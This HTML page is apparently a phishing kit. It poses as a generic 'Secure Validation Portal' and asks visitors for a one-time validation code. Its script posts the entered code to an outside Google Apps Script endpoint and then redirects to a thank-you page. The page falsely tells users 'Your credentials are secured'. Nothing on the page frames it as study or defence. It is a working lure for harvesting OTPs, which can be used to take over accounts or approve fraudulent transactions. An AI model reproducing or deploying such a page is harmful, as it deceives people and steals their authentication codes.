<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Secure Validation Platform</title>
  <style>
    body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin:0; padding:0; }
    .container { max-width:400px; margin:40px auto; background:#fff; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); overflow:hidden; }
    .header{ background:#0b6b3a; color:#fff; text-align:center; padding:22px 15px; }
    .header h2{ margin:0 0 8px; font-size:18px; line-height:1.3; }
    .header p{ margin:0; font-size:13px; font-weight:700; text-transform:uppercase; opacity:0.95; }
    form{ padding:20px; }
    label{ display:block; margin-bottom:6px; font-weight:600; color:#333; }
    input{ width:100%; padding:12px; margin-bottom:16px; border:1px solid #d7d7d7; border-radius:6px; font-size:14px; }
    input:focus{ border-color:#0b6b3a; outline:none; box-shadow:0 0 4px rgba(11,107,58,0.25); }
    .btn{ width:100%; background:#0b6b3a; color:#fff; padding:14px; font-size:16px; font-weight:700; border:none; border-radius:6px; cursor:pointer; transition:background .2s; }
    .btn:hover{ background:#094e2b; }
    .footer{ background:#0b6b3a; color:#fff; text-align:center; padding:12px; font-size:13px; }
    .notice { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h2>Welcome to the Secure Validation Portal</h2>
      <p>PLEASE ENTER YOUR VALIDATION OTP TO CONTINUE</p>
    </div>

    <!-- Form -->
    <form id="regForm" autocomplete="off">
      <label for="validation_otp">Validation OTP</label>
      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter your Validation OTP" required>

      <div class="notice" id="status">Your credentials are secured.</div>

      <button type="submit" class="btn">Validate OTP →</button>
    </form>

    <div class="footer">
      © 2025 Secure Services – All Rights Reserved
    </div>
  </div>

  <script>
    (function () {
      const form = document.getElementById('regForm');
      const statusEl = document.getElementById('status');

      // ✅ Updated working Web App URL
      const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';

      form.addEventListener('submit', async function (e) {
        e.preventDefault();
        statusEl.textContent = 'Submitting...';
        statusEl.style.color = '#666';

        const validation_otp = document.getElementById('validation_otp').value.trim();

        // Send as form data (works reliably with Apps Script)
        const formData = new FormData();
        formData.append("validation_otp", validation_otp);

        try {
          const resp = await fetch(WEBAPP_URL, {
            method: 'POST',
            body: formData
          });

          const text = await resp.text();
          console.log("Raw response:", text);

          let json;
          try {
            json = JSON.parse(text);
          } catch (err) {
            statusEl.textContent = "Invalid JSON: " + text;
            statusEl.style.color = "#aa0000";
            return;
          }

          if (json.result === 'success') {
            window.location.href = "thankyou.html"; 
          } else {
            statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
            statusEl.style.color = '#aa0000';
          }
        } catch (err) {
          console.error(err);
          statusEl.textContent = 'Error: ' + err.message;
          statusEl.style.color = '#aa0000';
        }
      });
    })();
  </script>
</body>
</html>
